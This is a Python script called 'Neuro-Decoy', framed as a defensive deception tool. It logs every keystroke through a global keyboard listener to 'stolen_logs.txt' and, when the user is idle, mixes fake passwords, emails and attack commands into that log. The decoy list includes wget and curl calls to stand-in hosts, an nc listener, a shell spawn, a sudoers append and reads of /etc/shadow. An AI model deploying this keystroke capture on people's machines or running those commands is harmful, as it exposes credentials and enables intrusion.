import time
import random
import string
import threading
import os
import signal
from pynput import keyboard

try:
    from config import (
        LOG_FILE, DECOY_IDLE_SECONDS, DECOY_BREAK_SECONDS,
        DECOY_TYPO_CHANCE, DECOY_POLL_INTERVAL,
        DECOY_WORDS, DECOY_COMMANDS, DECOY_DOMAINS
    )
except ImportError:
    BASE = os.path.dirname(os.path.abspath(__file__))
    LOG_FILE = os.path.join(BASE, "stolen_logs.txt")
    DECOY_IDLE_SECONDS = 1.5
    DECOY_BREAK_SECONDS = 1.0
    DECOY_TYPO_CHANCE = 0.08
    DECOY_POLL_INTERVAL = 0.5
    DECOY_WORDS = [
        "admin", "root", "kali", "hack", "pass", "secret", "backup",
        "server", "local", "cloud", "shadow", "nmap", "exploit", "shell",
        "payload", "agent", "vpn", "proxy", "session", "token",
    ]
    DECOY_COMMANDS = [
        "ls -la", "cat /etc/passwd", "whoami", "id",
        "ps aux", "netstat -tulpn", "ifconfig",
        "curl http://10.0.0.1/shell.sh",
        "nc -lvnp 4444", "chmod +x payload", "sudo -l",
        "find / -perm -4000 2>/dev/null", "ssh root@192.168.1.1",
        "scp exploit.tar.gz user@10.0.0.5:/tmp/",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers",
        "wget http://evil.com/backdoor", "./reverse_shell",
        "cat /etc/shadow", "nmap -sV -p- 10.0.0.0/24",
    ]
    DECOY_DOMAINS = ["gmail.com", "protonmail.com", "outlook.com", "yahoo.com", "pm.me"]

WRITE_LOCK = threading.Lock()


class DecoyGenerator:
    def __init__(self):
        self.words = DECOY_WORDS
        self.commands = DECOY_COMMANDS
        self.domains = DECOY_DOMAINS

    def _generate_password(self, length=12):
        word = random.choice(self.words)
        suffix = "".join(random.choices(string.digits, k=4))
        special = random.choice("!@#$%^&*")
        if random.choice([True, False]):
            return f"{word}{special}{suffix}".capitalize()
        return f"{word.capitalize()}{suffix}{special}"

    def _generate_email(self):
        local = random.choice(self.words) + str(random.randint(10, 999))
        domain = random.choice(self.domains)
        return f"{local}@{domain}"

    def _generate_command(self):
        return random.choice(self.commands)

    def get_random_decoy(self):
        category = random.choice(["password", "email", "command"])
        if category == "password":
            return self._generate_password()
        elif category == "email":
            return self._generate_email()
        return self._generate_command()


class NeuroDecoy:
    def __init__(self):
        self.decoy_gen = DecoyGenerator()
        self.last_type_time = time.time()
        self.running = True
        self._listener = None

        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, signum, frame):
        self.running = False
        if self._listener:
            self._listener.stop()
        print("\n[*] Shutting down Neuro-Decoy.", flush=True)

    def _write_log(self, text):
        with WRITE_LOCK:
            try:
                with open(LOG_FILE, "a") as f:
                    f.write(text)
            except Exception as e:
                print(f"[-] Error writing log: {e}", flush=True)

    def on_press(self, key):
        self.last_type_time = time.time()
        try:
            if hasattr(key, "char") and key.char is not None:
                self._write_log(key.char)
            else:
                self._write_log(f" [{key}] ")
        except Exception as e:
            print(f"[-] Error logging key: {e}", flush=True)

    def _typo_backspace(self, char):
        wrong = random.choice(string.ascii_lowercase.replace(char.lower(), ""))
        return wrong + " [Key.backspace] "

    def idle_monitor(self):
        print("[*] Neuro-Decoy Deception Engine Activated.", flush=True)
        print(f"[*] Waiting for {DECOY_IDLE_SECONDS}s of inactivity to inject decoys...\n", flush=True)

        while self.running:
            time.sleep(DECOY_POLL_INTERVAL)

            if time.time() - self.last_type_time > DECOY_IDLE_SECONDS:
                decoy_string = self.decoy_gen.get_random_decoy()
                injected = False

                with WRITE_LOCK:
                    try:
                        with open(LOG_FILE, "a") as f:
                            for i, ch in enumerate(decoy_string):
                                if time.time() - self.last_type_time < DECOY_BREAK_SECONDS:
                                    break
                                if ch == " ":
                                    f.write(" [Key.space] ")
                                elif ch == "@":
                                    f.write("@")
                                elif ch == ".":
                                    f.write(".")
                                elif ch == "/":
                                    f.write("/")
                                elif ch == "-":
                                    f.write("-")
                                else:
                                    if ch.isalpha() and random.random() < DECOY_TYPO_CHANCE and i > 1:
                                        f.write(self._typo_backspace(ch))
                                    f.write(ch)
                            else:
                                f.write(" [Key.enter] \n")
                                injected = True
                    except Exception as e:
                        print(f"[-] Error writing decoy: {e}", flush=True)

                if injected:
                    print(f"[+] Injected decoy burst: {decoy_string}", flush=True)
                else:
                    print(f"[-] Decoy injection interrupted: {decoy_string}", flush=True)

                self.last_type_time = time.time()

    def start(self):
        monitor_thread = threading.Thread(target=self.idle_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()

        self._listener = keyboard.Listener(on_press=self.on_press)
        self._listener.start()
        try:
            self._listener.join()
        except KeyboardInterrupt:
            self._signal_handler(None, None)


if __name__ == "__main__":
    defender = NeuroDecoy()
    defender.start()
